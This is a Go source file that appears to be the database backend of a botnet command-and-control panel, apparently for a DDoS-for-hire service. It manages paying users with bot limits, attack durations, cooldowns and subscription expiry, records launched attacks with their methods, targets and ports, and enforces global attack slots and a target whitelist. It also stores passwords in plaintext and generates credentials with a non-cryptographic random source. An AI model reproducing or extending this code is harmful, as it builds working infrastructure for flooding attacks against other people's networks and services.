package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	username  string
	maxBots   int
	admin     int
	last_paid int
	intvl     int
	ban       int
}

type UserInfo struct {
	username       string
	maxBots        int
	admin          int
	cooldown       int
	duration_limit int
	online         int
	last_paid      int
	intvl          int
	api_access     int
	ban            int
}
type OngoingAttack struct {
	username  string
	command   string
	time_sent int64
	duration  int
	method    string
	targets   string
	port      string
	time_left int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	dsn := fmt.Sprintf("%s:%s@tcp(%s)/", dbUser, dbPassword, dbAddr)
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		fmt.Println("Error connecting to MySQL:", err)
		return nil
	}

	var exists bool
	err = db.QueryRow("SELECT EXISTS(SELECT 1 FROM information_schema.schemata WHERE schema_name = ?)", dbName).Scan(&exists)
	if err != nil {
		fmt.Println("Error checking if database exists:", err)
		db.Close()
		return nil
	}
	if !exists {
		_, err = db.Exec("CREATE DATABASE " + dbName)
		if err != nil {
			fmt.Println("Error creating database:", err)
			db.Close()
			return nil
		}
		fmt.Println("Database 'Morte' created")
	}
	db.Close()

	dsn = fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName)
	db, err = sql.Open("mysql", dsn)
	if err != nil {
		fmt.Println("Error connecting to database:", err)
		return nil
	}
	database := &Database{db}

	tables := map[string]string{
		"history": `
            CREATE TABLE history (
                id int(10) unsigned NOT NULL AUTO_INCREMENT,
                user_id int(10) unsigned NOT NULL,
                time_sent int(10) unsigned NOT NULL,
                duration int(10) unsigned NOT NULL,
                command text NOT NULL,
                max_bots int(11) DEFAULT '-1',
                status ENUM('running', 'stopped', 'success') NOT NULL DEFAULT 'running',
                PRIMARY KEY (id),
                KEY user_id (user_id)
            )`,
		"users": `
            CREATE TABLE users (
                id int(10) unsigned NOT NULL AUTO_INCREMENT,
                username varchar(32) NOT NULL,
                password varchar(32) NOT NULL,
                duration_limit int(10) unsigned DEFAULT NULL,
                cooldown int(10) unsigned NOT NULL,
                wrc int(10) unsigned DEFAULT NULL,
                last_paid int(10) unsigned NOT NULL,
                max_bots int(11) DEFAULT '-1',
                admin int(10) unsigned DEFAULT '0',
                intvl int(10) unsigned DEFAULT '30',
                api_key text,
				api_access TINYINT(1) DEFAULT 0,
				ban TINYINT(1) DEFAULT 0,
                online TINYINT(1) DEFAULT 0,
                is_initial_password TINYINT(1) DEFAULT 0,
                PRIMARY KEY (id),
                KEY username (username)
            )`,
		"whitelist": `
            CREATE TABLE whitelist (
                id int(10) unsigned NOT NULL AUTO_INCREMENT,
                prefix varchar(16) DEFAULT NULL,
                netmask tinyint(3) unsigned DEFAULT NULL,
                PRIMARY KEY (id),
                KEY prefix (prefix)
            )`,
		"settings": `
            CREATE TABLE settings (
                id INT UNSIGNED NOT NULL AUTO_INCREMENT,
                ` + "`key`" + ` VARCHAR(32) NOT NULL,
                value VARCHAR(32) NOT NULL,
                PRIMARY KEY (id),
                UNIQUE KEY (` + "`key`" + `)
            )`,
	}

	for tableName, createSQL := range tables {
		var exists bool
		err = db.QueryRow("SELECT EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = ?)", tableName).Scan(&exists)
		if err != nil {
			fmt.Println("Error checking if table exists:", err)
			db.Close()
			return nil
		}
		if !exists {
			_, err = db.Exec(createSQL)
			if err != nil {
				fmt.Println("Error creating table:", err)
				db.Close()
				return nil
			}
			fmt.Printf("Table '%s' created\n", tableName)
		}
	}

	_, err = db.Exec("INSERT IGNORE INTO settings (`key`, `value`) VALUES ('attacks_enabled', '1')")
	if err != nil {
		fmt.Println("Error inserting initial settings:", err)
		db.Close()
		return nil
	}

	var count int
	err = db.QueryRow("SELECT COUNT(*) FROM users").Scan(&count)
	if err != nil {
		fmt.Println("Error checking users:", err)
		return database
	}
	if count == 0 {
		password := generateRandomPassword(8)
		apiKey := generateAPIKey()
		_, err = db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit, intvl, api_key, api_access, ban, online, is_initial_password) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?, ?, ?, ?, ?, 0, ?)",
			"root", password, -1, 0, 0, 0, apiKey, 1, 0, 1)

		if err != nil {
			fmt.Println("Error creating root user:", err)
		} else {
			err = os.WriteFile("first_user.txt", []byte("Username: root\nPassword: "+password+"\nAPI Key: "+apiKey), 0644)
			if err != nil {
				fmt.Println("Error writing first_user.txt:", err)
			} else {
				fmt.Println("Root user created and credentials saved to first_user.txt")
			}
		}
	}
	return database
}

func (this *Database) UpdateInitialPassword(username, newPassword string) error {
	_, err := this.db.Exec("UPDATE users SET password = ?, is_initial_password = 0 WHERE username = ?", newPassword, username)
	return err
}

func (this *Database) UpdateUserExpiry(username string, intvl int) error {
	_, err := this.db.Exec("UPDATE users SET intvl = ? WHERE username = ?", intvl, username)
	return err
}

func (this *Database) UpdateUserCooldown(username string, cooldown int) error {
	_, err := this.db.Exec("UPDATE users SET cooldown = ? WHERE username = ?", cooldown, username)
	return err
}

func (this *Database) UpdateUserDurationLimit(username string, limit int) error {
	_, err := this.db.Exec("UPDATE users SET duration_limit = ? WHERE username = ?", limit, username)
	return err
}

func (this *Database) UpdateUserMaxBots(username string, maxBots int) error {
	_, err := this.db.Exec("UPDATE users SET max_bots = ? WHERE username = ?", maxBots, username)
	return err
}

func (this *Database) UpdateUserAdminStatus(username string, isAdmin int) error {
	_, err := this.db.Exec("UPDATE users SET admin = ? WHERE username = ?", isAdmin, username)
	return err
}

func (this *Database) UpdateUserBanStatus(username string, isBanned int) error {
	_, err := this.db.Exec("UPDATE users SET ban = ? WHERE username = ?", isBanned, username)
	return err
}

func (this *Database) UpdateUserAPIAccess(username string, hasAccess int) error {
	_, err := this.db.Exec("UPDATE users SET api_access = ? WHERE username = ?", hasAccess, username)
	return err
}

func (this *Database) UpdateAttackStatus(enabled bool) error {
	value := "0"
	if enabled {
		value = "1"
	}
	_, err := this.db.Exec("UPDATE settings SET value = ? WHERE `key` = 'attacks_enabled'", value)
	return err
}

func (this *Database) GetUserAPIKey(username string) (string, error) {
	var apiKey string
	err := this.db.QueryRow("SELECT api_key FROM users WHERE username = ?", username).Scan(&apiKey)
	if err != nil {
		return "N/A", err
	}
	return apiKey, nil
}

func generateAPIKey() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	const keyLength = 8
	key := make([]byte, keyLength)
	for i := range key {
		key[i] = charset[rand.Intn(len(charset))]
	}
	return string(key)
}

func (this *Database) apiAccess(username string) (bool, error) {
	var exists bool
	err := this.db.QueryRow("SELECT EXISTS(SELECT 1 FROM users WHERE username = ? AND api_access = 1)", username).Scan(&exists)
	if err != nil {
		return false, err
	}
	return exists, nil
}

func (this *Database) ValidateAPIKey(username string, apikey string) (bool, AccountInfo, error) {
	rows, err := this.db.Query("SELECT username, max_bots, admin, last_paid, intvl FROM users WHERE username = ? AND api_key = ?", username, apikey)
	if err != nil {
		return false, AccountInfo{}, err
	}
	defer rows.Close()

	if !rows.Next() {
		return false, AccountInfo{}, nil
	}

	var accInfo AccountInfo
	err = rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin, &accInfo.last_paid, &accInfo.intvl)
	if err != nil {
		return false, AccountInfo{}, err
	}

	if accInfo.intvl != 0 {
		currentTime := time.Now().Unix()
		expiryTime := int64(accInfo.last_paid) + int64(accInfo.intvl)*24*60*60
		if currentTime >= expiryTime {
			return false, AccountInfo{}, errors.New("account expired")
		}
	}

	return true, accInfo, nil
}

func generateRandomPassword(length int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	password := make([]byte, length)
	for i := range password {
		password[i] = charset[rand.Intn(len(charset))]
	}
	return string(password)
}

func (this *Database) SetOnline(username string, online bool) error {
	var onlineInt int
	if online {
		onlineInt = 1
	} else {
		onlineInt = 0
	}
	_, err := this.db.Exec("UPDATE users SET online = ? WHERE username = ?", onlineInt, username)
	return err
}

func (this *Database) GetAllUsers() ([]UserInfo, error) {
	rows, err := this.db.Query("SELECT username, max_bots, admin, cooldown, duration_limit, online, last_paid, intvl, api_access, ban FROM users")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []UserInfo
	for rows.Next() {
		var user UserInfo
		err := rows.Scan(&user.username, &user.maxBots, &user.admin, &user.cooldown, &user.duration_limit, &user.online, &user.last_paid, &user.intvl, &user.api_access, &user.ban)
		if err != nil {
			return nil, err
		}
		users = append(users, user)
	}
	return users, nil
}

func (this *Database) AreAttacksEnabled() (bool, error) {
	var value string
	err := this.db.QueryRow("SELECT value FROM settings WHERE `key` = 'attacks_enabled'").Scan(&value)
	if err == sql.ErrNoRows {
		return true, nil
	} else if err != nil {
		return false, err
	}
	return value == "1", nil
}

func (this *Database) GetOnlineUserCount() int {
	var count int
	err := this.db.QueryRow("SELECT COUNT(*) FROM users WHERE online = 1").Scan(&count)
	if err != nil {
		fmt.Println("Error getting online user count:", err)
		return 0
	}
	return count
}

func (this *Database) GetUserInfo(username string) (*UserInfo, error) {
	var user UserInfo
	err := this.db.QueryRow("SELECT username, max_bots, admin, cooldown, duration_limit, online, last_paid, intvl, api_access, ban FROM users WHERE username = ?", username).
		Scan(&user.username, &user.maxBots, &user.admin, &user.cooldown, &user.duration_limit, &user.online, &user.last_paid, &user.intvl, &user.api_access, &user.ban)
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, errors.New("user not found")
		}
		return nil, err
	}
	return &user, nil
}

func (this *Database) ChangePass(username string, newPassword string) bool {
	if newPassword == "" {
		fmt.Println("\x1b[48;5;231m \033[38;5;125mNew password cannot be empty \033[0m\x1b[1;37m")
		return false
	}

	result, err := this.db.Exec("UPDATE users SET password = ? WHERE username = ?", newPassword, username)
	if err != nil {
		fmt.Println("\x1b[48;5;231m \033[38;5;125mError updating password :  \033[0m\x1b[1;37m", err)
		return false
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		fmt.Println("\x1b[48;5;231m \033[38;5;125mError checking rows affected :  \033[0m\x1b[1;37m", err)
		return false
	}

	if rowsAffected == 0 {
		fmt.Println("\x1b[48;5;231m \033[38;5;125mNo user found with that username \033[0m\x1b[1;37m")
		return false
	}

	fmt.Println("Password successfully changed for user:", username)
	return true
}

func (this *Database) GetOngoingAttacks(username string, isAdmin bool) ([]OngoingAttack, error) {
	currentTime := time.Now().Unix()
	query := `
        SELECT u.username, h.command, h.time_sent, h.duration
        FROM history h
        JOIN users u ON h.user_id = u.id
        WHERE h.time_sent + h.duration > ? AND h.status = 'running'
    `

	var args []interface{}
	args = append(args, currentTime)
	if !isAdmin {
		query += " AND u.username = ?"
		args = append(args, username)
	}
	rows, err := this.db.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []OngoingAttack
	for rows.Next() {
		var attack OngoingAttack
		err := rows.Scan(&attack.username, &attack.command, &attack.time_sent, &attack.duration)
		if err != nil {
			return nil, err
		}
		parts := strings.Fields(attack.command)
		if len(parts) >= 2 {
			attack.method = parts[0]
			attack.targets = parts[1]
			for _, part := range parts[2:] {
				if strings.HasPrefix(part, "dport=") {
					attack.port = strings.TrimPrefix(part, "dport=")
					break
				}
			}
		}
		attack.time_left = int(attack.time_sent + int64(attack.duration) - currentTime)
		if attack.time_left < 0 {
			attack.time_left = 0
		}
		attacks = append(attacks, attack)
	}
	return attacks, nil
}

func (this *Database) TryLogin(username string, password string) (AccountInfo, int, error) {
	rows, err := this.db.Query("SELECT username, max_bots, admin, last_paid, intvl, is_initial_password, ban FROM users WHERE username = ? AND password = ?", username, password)
	if err != nil {
		fmt.Println("Database error:", err)
		return AccountInfo{}, 0, errors.New("database error")
	}
	defer rows.Close()

	if !rows.Next() {
		return AccountInfo{}, 0, errors.New("invalid credentials")
	}

	var accInfo AccountInfo
	var isInitialPassword int
	err = rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin, &accInfo.last_paid, &accInfo.intvl, &isInitialPassword, &accInfo.ban)
	if err != nil {
		fmt.Println("Scan error:", err)
		return AccountInfo{}, 0, errors.New("database error")
	}

	if accInfo.intvl != 0 {
		currentTime := time.Now().Unix()
		expiryTime := int64(accInfo.last_paid) + int64(accInfo.intvl)*24*60*60
		if currentTime >= expiryTime {
			return AccountInfo{}, 0, errors.New("account expired")
		}
	}

	if accInfo.ban != 0 {
		return AccountInfo{}, 0, errors.New("account banned")
	}

	return accInfo, isInitialPassword, nil
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int, intvl int, apiAccess int, admin int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	apiKey := generateAPIKey()
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit, intvl, api_key, api_access, ban) VALUES (?, ?, ?, ?, UNIX_TIMESTAMP(), ?, ?, ?, ?, ?, ?)",
		username, password, max_bots, admin, cooldown, duration, intvl, apiKey, apiAccess, 0)
	return true
}

func (this *Database) fetchAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) fetchUsers() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM users")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) fetchRunningAttacks() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM history WHERE (time_sent + duration) > UNIX_TIMESTAMP() AND status = 'running'")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) removeUser(username string) bool {
	rows, err := this.db.Query("DELETE FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM users WHERE username = ?", username)
	return true
}

func (this *Database) CleanLogs() bool {
	rows, err := this.db.Query("DELETE FROM history")
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM history")
	return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask {
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask {
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else {
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int, gobalSlot int) (bool, error) {
	if strings.HasPrefix(fullCommand, "stop") {
		rows, err := this.db.Query("SELECT admin FROM users WHERE username = ?", username)
		if err != nil {
			return false, fmt.Errorf("error checking user permissions: %s", err.Error())
		}
		defer rows.Close()
		if !rows.Next() {
			return false, errors.New("user not found")
		}
		var admin int
		err = rows.Scan(&admin)
		if err != nil {
			return false, fmt.Errorf("error scanning admin status: %s", err.Error())
		}
		return true, nil
	}

	enabled, err := this.AreAttacksEnabled()
	if err != nil {
		return false, fmt.Errorf("error checking attack status: %s", err.Error())
	}
	if !enabled {
		return false, errors.New("attacks are currently disabled")
	}

	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
		return false, errors.New("database error")
	}
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("your max attack time is %d seconds", durationLimit))
	}
	rows.Close()

	runningAttacks := this.fetchRunningAttacks()
	if runningAttacks >= gobalSlot {
		return false, errors.New("global attack slots are full")
	}

	if admin == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
			return false, errors.New("database error")
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots, status) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?, 'running')", userId, duration, fullCommand, maxBots)
	return true, nil
}

func (this *Database) StopAllRunningAttacks() (int64, error) {
	result, err := this.db.Exec("UPDATE history SET status = 'stopped' WHERE status = 'running' AND (time_sent + duration) > UNIX_TIMESTAMP()")
	if err != nil {
		return 0, err
	}
	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return 0, err
	}
	return rowsAffected, nil
}

func (this *Database) MarkCompletedAttacks() (int64, error) {
	query := "UPDATE history SET status = 'success' WHERE (time_sent + duration) <= UNIX_TIMESTAMP() AND status = 'running'"

	result, err := this.db.Exec(query)
	if err != nil {
		return 0, err
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return 0, err
	}

	return rowsAffected, nil
}
